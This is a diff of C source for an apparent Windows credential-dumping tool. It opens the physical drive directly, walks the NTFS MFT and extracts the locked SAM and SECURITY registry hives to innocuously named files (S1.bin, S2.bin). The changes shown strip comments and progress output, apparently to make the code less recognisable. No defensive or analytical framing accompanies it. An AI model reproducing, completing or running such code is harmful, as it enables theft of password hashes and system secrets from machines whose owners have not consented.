@@ -354,7 +354,6 @@ bool FindFileName(const BYTE* mft_entry, char* filename_out, int max_len) {
     if (found_any) {
         strcpy(filename_out, longest_name);
 
-        // Clean up non-printable characters
         int len = strlen(filename_out);
         while (len > 0 && (filename_out[len - 1] < 32 || filename_out[len - 1] > 126)) {
             filename_out[len - 1] = '\0';
@@ -453,7 +452,7 @@ bool ExtractNonResidentFile(HANDLE hDisk, const BYTE* mft_entry, const char* out
 
                 printf("  [SAVED] %s (%llu bytes)\n", output_filename, real_size);
 
-                // Restore file pointer position
+       
                 LARGE_INTEGER restore_pos;
                 restore_pos.QuadPart = *saved_position;
                 SetFilePointerEx(hDisk, restore_pos, NULL, FILE_BEGIN);
@@ -501,7 +500,6 @@ int main(int argc, char* argv[]) {
 
     const char* mode = argv[1];
 
-    // Define target files
     TargetFile targets[] = {
         {"SAM", false, false, 0, 0, "S1.bin"},
         {"SECURITY", false, false, 0, 0, "S2.bin"},
@@ -536,13 +534,11 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    // Count enabled targets
+
     int enabled_count = 0;
     for (int t = 0; t < target_count; t++) {
         if (targets[t].enabled) enabled_count++;
     }
-
-    // Open physical drive
 
     HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 
@@ -560,14 +556,13 @@ int main(int argc, char* argv[]) {
     }
     printf("[+] GPT disk\n");
 
-    // Find C: drive start LBA
+  
     if (!FindCDriveStartLBA(hDisk)) {
         CloseHandle(hDisk);
         return 1;
     }
     printf("[+] Drive found\n");
 
-    // Detect NTFS parameters
     if (!DetectNTFSParameters(hDisk)) {
         CloseHandle(hDisk);
         return 1;
@@ -611,15 +606,12 @@ int main(int argc, char* argv[]) {
             break;
         }
 
-        if (i % 1000 == 0 && i > 0) {
-            printf("  Scanned %d entries... (found %d/%d)\n", actual_entry, found_count, enabled_count);
-        }
 
         char filename[256] = { 0 };
         if (FindFileName(mft_entry, filename, sizeof(filename))) {
             const MFT_ENTRY_HEADER* header = (const MFT_ENTRY_HEADER*)mft_entry;
 
-            if (!(header->Flags & 0x02)) {  // Not a directory
+            if (!(header->Flags & 0x02)) { 
                 for (int t = 0; t < target_count; t++) {
                     if (targets[t].enabled && !targets[t].found && MatchesTarget(filename, targets[t].name)) {
                         printf("\n[+]Found %s at MFT entry #%d\n", targets[t].name, actual_entry);
